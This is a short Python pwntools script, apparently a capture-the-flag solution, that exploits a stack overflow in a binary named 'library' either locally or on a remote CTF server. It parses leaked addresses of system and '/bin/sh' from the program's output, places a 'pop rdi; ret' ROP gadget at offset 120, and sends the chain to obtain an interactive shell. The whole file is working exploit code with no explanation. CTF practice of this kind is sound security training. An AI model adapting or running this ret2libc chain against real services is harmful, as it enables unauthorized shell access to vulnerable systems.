#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e']
#context.log_level = 'debug'
context.binary = './build/library'

e = ELF('./build/library')
rop = ROP('./build/library')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('ctf.isss.io', 5679)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/library', cwd='problemDir')
else:
    p = e.process()

system = int(p.readline()[2:],16)
binsh = int(p.readline()[2:],16)

payload = flat({120: rop.find_gadget(['pop rdi','ret'])[0]},binsh,system)

p.sendline(payload)
p.interactive()
